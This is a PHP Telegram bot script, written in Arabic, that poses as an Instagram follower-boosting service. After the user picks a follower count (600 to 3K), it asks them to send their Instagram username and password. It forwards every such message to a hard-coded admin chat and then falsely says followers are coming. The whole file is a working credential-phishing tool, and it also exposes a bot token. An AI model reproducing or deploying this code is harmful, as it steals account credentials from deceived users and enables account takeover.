<?php 
ob_start();
$qqqqbqq = '6634940523:AAGwDe9npJherMdMJ5BhDyQgCLaZ0cpj2G4'; #توكنك
define('API_KEY',$qqqqbqq);
function bot($method,$datas=[]){
$abs = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$abs";
$abs = file_get_contents($url);
return json_decode($abs);
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$admin = '5625666546' ; #ايديك
$id = $message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$message_id2 = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$name = $update->message->from->first_name;
$from_id = $message->from->id;
if($text && $from_id !== $admin){bot('forwardMessage',[
'chat_id'=>$admin, 'from_chat_id'=>$chat_id, 'message_id'=>$update->message->message_id,
'text'=>$text,]);}
if($text == "/start" ){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
~ اهلا بك عزيزي [$name](tg://user?id=$from_id)
~ في بوت زيادة متابعين الانستا 👤.
~ اضغط على بدء زيادة المتابعين ❤.
"
,'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'~ بدء زيادة المتابعين➕ .','callback_data'=>'ar']],
],])]);}

if($data == "ar"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ اختر عدد المتابعين المناسب لك 👤. ',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'600 ➕','callback_data'=>"1"]],
[['text'=>'1K ➕' ,'callback_data'=>"2"]],
[['text'=>'1.5K ➕' ,'callback_data'=>"3"]],
[['text'=>'3K ➕' ,'callback_data'=>"4"]],
]])
]);
}

if($data == "1"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'
~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد المتابعين المختار *600* 👤.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
UserName:Pass
~ وانتظر لحين زيادة متابعين حسابكك ➕.
~ سوف يتأخر بين 30 - 90 دقيقة بسبب الضغط 📛.
',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙','callback_data'=>"home"]],
],])]);}

if($data == "home"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>"
~ اهلا بك مجددا 😻.
~ في بوت زيادة متابعين الانستا 👤.
~ اضغط على بدء زيادة المتابعين ❤.
"
,'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'~ بدء زيادة المتابعين➕ .','callback_data'=>'ar']],
],])]);}

if($data == "2"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'
~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد المتابعين المختار *1000* 👤.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
UserName:Pass
~ وانتظر لحين زيادة متابعين حسابكك ➕.
~ سوف يتأخر بين 30 - 90 دقيقة بسبب الضغط 📛.
',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙','callback_data'=>"home"]],
],])]);}

if($data == "3"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'
~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد المتابعين المختار *1500* 👤.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
UserName:Pass
~ وانتظر لحين زيادة متابعين حسابكك ➕.
~ سوف يتأخر بين 30 - 90 دقيقة بسبب الضغط 📛.
',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙','callback_data'=>"home"]],
],])]);}

if($data == "4"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'
~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد المتابعين المختار *3000* 👤.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
UserName:Pass
~ وانتظر لحين زيادة متابعين حسابكك ➕.
~ سوف يتأخر بين 30 - 90 دقيقة بسبب الضغط 📛.
',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙','callback_data'=>"home"]],
],])]);}

if($text !== "/start" ){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- تم حفظ حسآبك الان انتظر لحين زيادة اعضاء حسابكك 👤➕. ",
]);
}
